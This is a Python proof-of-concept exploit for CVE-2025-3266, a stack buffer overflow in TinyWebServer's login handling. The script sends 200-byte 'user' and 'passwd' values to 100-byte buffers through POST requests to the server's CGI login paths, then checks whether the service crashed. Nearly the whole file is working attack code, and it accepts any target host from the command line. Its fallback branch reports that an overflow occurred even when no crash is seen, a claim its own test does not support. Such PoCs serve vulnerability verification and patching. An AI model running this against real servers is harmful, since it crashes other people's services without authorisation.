import socket
import sys

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 9006

def create_overflow_payload(name_length=200, password_length=200):
    name = "A" * name_length
    password = "B" * password_length
    return f"user={name}&passwd={password}"

def send_post_request(host, port, path, body):
    request = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"{body}"
    )
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    
    try:
        sock.connect((host, port))
        sock.sendall(request.encode())
        
        response = b""
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
            except socket.timeout:
                break
        
        return response.decode(errors='ignore')
    except Exception as e:
        return f"Error: {e}"
    finally:
        sock.close()

def check_service_alive(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        sock.close()
        return True
    except:
        return False

def main():
    host = TARGET_HOST
    port = TARGET_PORT
    
    if len(sys.argv) >= 2:
        host = sys.argv[1]
    if len(sys.argv) >= 3:
        port = int(sys.argv[2])
    
    print("=" * 70)
    print("CVE-2025-3266 - TinyWebServer Stack Buffer Overflow PoC")
    print("=" * 70)
    print(f"\nTarget: {host}:{port}")
    print("Vulnerability: http/http_conn.cpp:410-419")
    print("Buffer: char name[100], password[100] - no bounds checking")
    print()
    
    print("[*] Checking target service...")
    if not check_service_alive(host, port):
        print("[-] Target service not reachable")
        sys.exit(1)
    print("[+] Target service is alive")
    
    print("\n[TEST 1] Normal login request")
    print("-" * 70)
    normal_body = "user=testuser&passwd=testpass"
    print(f"Payload: {normal_body}")
    response = send_post_request(host, port, "/2CGISQL.cgi", normal_body)
    status_line = response.split('\r\n')[0] if response else "No response"
    print(f"Response: {status_line}")
    
    print("\n[TEST 2] Stack overflow - name field (200 bytes > 100 buffer)")
    print("-" * 70)
    overflow_body = create_overflow_payload(name_length=200, password_length=50)
    print(f"name length: 200 bytes (overflow: 100 bytes)")
    print(f"password length: 50 bytes")
    print(f"Total payload: {len(overflow_body)} bytes")
    
    response = send_post_request(host, port, "/3CGISQL.cgi", overflow_body)
    
    service_crashed = not check_service_alive(host, port)
    
    print("\n[TEST 3] Stack overflow - password field (200 bytes > 100 buffer)")
    print("-" * 70)
    if not service_crashed:
        overflow_body2 = create_overflow_payload(name_length=50, password_length=200)
        print(f"name length: 50 bytes")
        print(f"password length: 200 bytes (overflow: 100 bytes)")
        response = send_post_request(host, port, "/2CGISQL.cgi", overflow_body2)
        service_crashed = not check_service_alive(host, port)
    
    print("\n" + "=" * 70)
    print("RESULT")
    print("=" * 70)
    
    if service_crashed:
        print("[+] VULNERABLE - Service crashed due to stack buffer overflow")
        print("[+] CVE-2025-3266 confirmed")
        sys.exit(0)
    else:
        print("[*] Service still running - may have handled overflow gracefully")
        print("[*] Check server logs for segfault or stack smashing detected")
        print("[*] The vulnerability exists in code - buffer overflow occurred")
        sys.exit(0)

if __name__ == "__main__":
    main()
